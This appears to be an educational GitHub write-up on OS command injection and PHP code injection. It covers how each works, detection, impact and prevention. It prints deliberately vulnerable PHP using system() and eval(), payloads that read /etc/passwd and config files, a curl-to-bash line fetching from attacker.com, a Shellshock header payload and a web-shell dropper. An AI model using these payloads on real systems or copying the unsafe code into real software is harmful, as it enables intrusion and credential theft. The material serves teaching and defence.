![a1](https://github.com/user-attachments/assets/dcdf6882-0d9d-40f7-933a-c4ed61256f1f)


Command Injection is a vulnerability in web applications that occurs when **user input is passed directly into system commands without proper validation**.

This allows an attacker to inject arbitrary **Operating System (OS) commands**, making the server execute them with the privileges of the web server process (e.g., `www-data` on Linux or `IIS_IUSRS` on Windows).

This is a **critical security flaw** because it can result in:

* Unauthorized access to sensitive data
* Stolen credentials or configuration files
* Remote Code Execution (RCE)
* Full compromise of the server and potentially the internal network

---

## How It Works

### User Input Handling

* Web applications take user input via:

  * **Forms**
  * **URL query parameters**
  * **HTTP headers** (e.g., `User-Agent`, `Referer`)
  * **Cookies**

Example vulnerable code:

```php
<?php
$file = $_GET['file'];
system("cat " . $file);
?>
```

If the developer doesn’t sanitize `$file`, the attacker can inject commands instead of just a filename.

---

### Lack of Input Sanitization

If input is not **validated**, **sanitized**, or **escaped**, attackers can append extra instructions.

Example malicious input:

```
file.txt; ls -la
```

This makes the server execute two commands:

1. `cat file.txt`
2. `ls -la`

---

### Injection Points

Attackers test places where user input is used in commands:

* Search boxes
* File upload fields
* Contact forms
* URL query parameters
* Hidden form fields
* HTTP headers

Example URL exploitation:

```
http://example.com/search.php?file=report.txt;cat /etc/passwd
```

Server executes:

```
cat report.txt; cat /etc/passwd
```

---

## Causes of Command Injection

1. **Malicious Input**

   Attackers exploit **shell metacharacters** like:

   * `;` → command separator
   * `|` → pipe output into another command
   * `&` → run multiple commands
   * Backticks (\`\`) → command substitution
   * `$()` → command substitution

   Example:

   ```
   ping -c 1 example.com; whoami
   ```

   The injected `whoami` runs after the `ping`.

2. **Command Execution**

   The server trusts the input and passes it directly to a shell.
   The OS executes the **entire constructed string**, including injected commands.

---

## Exploitation

1. **Unauthorized Execution**

   Example payloads:

   ```bash
   ; id
   ; uname -a
   ; cat /etc/passwd
   ```

   These reveal system info, users, and OS version.

2. **Data Exfiltration**

   ```bash
   ; cat /var/www/config.php
   ```

   Could expose database usernames and passwords.

3. **System Manipulation**

   Install backdoors or malware:

   ```bash
   ; curl http://attacker.com/shell.sh | bash
   ```

   This downloads and runs a remote shell.

---

## Impact of Command Injection

* Full server compromise
* Data theft (credentials, API keys, sensitive files)
* Remote persistence (backdoors, cron jobs, reverse shells)
* Network pivoting into internal systems
* Potential ransomware or botnet infections

---

## Real-World Example

The **Shellshock vulnerability (CVE-2014-6271)** was a famous Command Injection bug in Bash. Attackers injected commands via HTTP headers like `User-Agent`.

Example exploit:

```http
User-Agent: () { :; }; /bin/bash -c "cat /etc/passwd"
```

---

## Detection Techniques

* **Manual Testing**

  * Try payloads like `;id`, `|whoami`, or backticks.
  * Check server response for command output.

* **Automated Tools**

  * [Burp Suite Intruder](https://portswigger.net/burp)
  * [Commix](https://github.com/commixproject/commix)
  * [OWASP ZAP](https://www.zaproxy.org/)

* **Error Responses**

  * Unexpected error messages may indicate command execution.

---

## Prevention

1. **Avoid Direct OS Calls**

   * Use safer APIs instead of system commands.
   * Example: use PHP’s `file_get_contents()` instead of `system("cat file")`.

2. **Input Validation**

   * Apply whitelisting (only allow expected values).
   * Reject unexpected characters like `;`, `|`, `&`.

3. **Escaping**

   * If commands are unavoidable, escape input properly.
   * PHP example: `escapeshellarg()` or `escapeshellcmd()`.

4. **Least Privilege**

   * Run applications with minimal OS privileges.
   * Don’t allow the web server user to access sensitive files.

5. **Web Application Firewall (WAF)**

   * Detect and block common injection payloads.

---

# PHP Code Injection

## What It Is

PHP Code Injection occurs when **user input is executed as PHP code**.

This is not about shell commands, but about injecting raw PHP that the server interprets.

It’s extremely dangerous because it gives the attacker **application-level execution power**.

---

## How It Works

### Malicious Input

The attacker submits PHP code via forms, URLs, or uploads.

Example payload:

```php
<?php system('id'); ?>
```

---

### Code Execution

Example vulnerable code:

```php
<?php
eval($_GET['code']);
?>
```

If attacker visits:

```
http://example.com/vuln.php?code=system('whoami');
```

The server executes `system('whoami')`.

---

## Examples of PHP Code Injection

1. **Read Files**

   ```php
   <?php echo file_get_contents('/etc/passwd'); ?>
   ```

2. **Run System Commands**

   ```php
   <?php system('ls -la'); ?>
   ```

3. **Drop a Web Shell**

   ```php
   <?php file_put_contents('shell.php','<?php system($_GET["cmd"]); ?>'); ?>
   ```

   Now the attacker can access:

   ```
   http://example.com/shell.php?cmd=whoami
   ```

---

## Impact of PHP Code Injection

* Remote Code Execution (RCE)
* Database compromise
* Persistent backdoors
* Pivoting deeper into the network
* Complete server takeover

---

## Difference Between Command Injection & PHP Code Injection

* **Command Injection**: Input is passed to the **OS shell**.
* **PHP Code Injection**: Input is evaluated as **PHP code**.

Both lead to RCE, but they exploit different layers.

---

## Prevention of PHP Code Injection

1. **Never use `eval()` or similar functions**

   * Dangerous functions: `eval()`, `preg_replace('/e/')`, `create_function()`, `assert()`

2. **Sanitize Input**

   * Use strict input validation (type checking, whitelisting).

3. **Disable Dangerous Functions**

   * In `php.ini`, disable `exec`, `system`, `passthru`, `shell_exec`.

4. **Use Secure Coding Practices**

   * Avoid dynamic code execution altogether.
   * Use frameworks with built-in protections.

---
